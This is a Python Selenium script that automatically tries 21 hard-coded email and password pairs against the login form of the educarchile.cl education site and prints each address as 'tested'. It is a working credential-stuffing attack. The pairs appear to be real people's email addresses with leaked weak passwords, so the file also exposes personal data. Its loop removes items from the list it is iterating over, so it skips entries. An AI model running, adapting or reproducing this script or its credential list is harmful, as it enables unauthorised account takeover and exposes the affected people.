from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time

users = [["ayelen", "marytina77@hotmail.com "],
         ["seminario", "asdiaz56@gmail.com"],
         ["piterio", "piterio@mixmail.com"],
         ["ntf1218",      "ce1ntf@gmail.com"],
         ["coronel1965",     "cindy_denisse@msn.com "],
         ["ragnarok27",     "amarcielo@gmail.com"],
         ["silviabreu",   "cieloazulsyac@hotmail.com"],
         ["martin", "catali_toledo@yahoo.es"],
         ["14cobarde08", "pisadorafea@hotmail.com"],
         ["agostomami",         "cijp@educarchile.cl"],
         ["lechuga", "cilechug@uc.cl"],
         ["0303456",     "elian_cillo_4@hotmail.com"],
         ["vico-c",   "CINTIA.VALLEJOS@GMAIL.COM"],
         ["ulises",  "cnarvaez@arkitem.cl"],
         ["123456", "cintiacarola@hotmail.com"],
         ["561712",       "cindiapg@gmail.com"],
         ["insidebip", "cindiacpalmac@gmail.com"],
         ["27022702",  "lagos.cindy@gmail.com"],
         ["171972604",         "bababy_xindi@hotmail.com"],
         ["sandruca", "salearza@hotmail.com"],
         ["250402", "lzapata025@yahoo.es"]]

driver = webdriver.Chrome()
driver.set_window_size(1920, 1080)
driver.get("http://www.educarchile.cl")

login_page = driver.find_element(
    by=By.XPATH, value='//*[@id="block-menuentraramicuenta"]/ul/li[1]/a')
login_page.click()


for u in users:
    user = driver.find_element(
        by=By.XPATH, value='//*[@id="edit-name"]')
    password = driver.find_element(
        by=By.XPATH, value='//*[@id="edit-pass"]')
    time.sleep(3)
    user.send_keys(u[1])
    password.send_keys(u[0])
    password.send_keys(Keys.ENTER)
    print(u[1], "ha sido testeado")
    users.pop(0)
    main_menu = driver.find_element(
        by=By.XPATH, value='//*[@id="block-educarchile-footer"]/ul/li[2]/a')
    driver.execute_script("arguments[0].click();", main_menu)
    login = driver.find_element(
        by=By.XPATH, value='//*[@id="block-menuentraramicuenta"]/ul/li[1]/a')
    driver.execute_script("arguments[0].click();", login)
driver.quit()
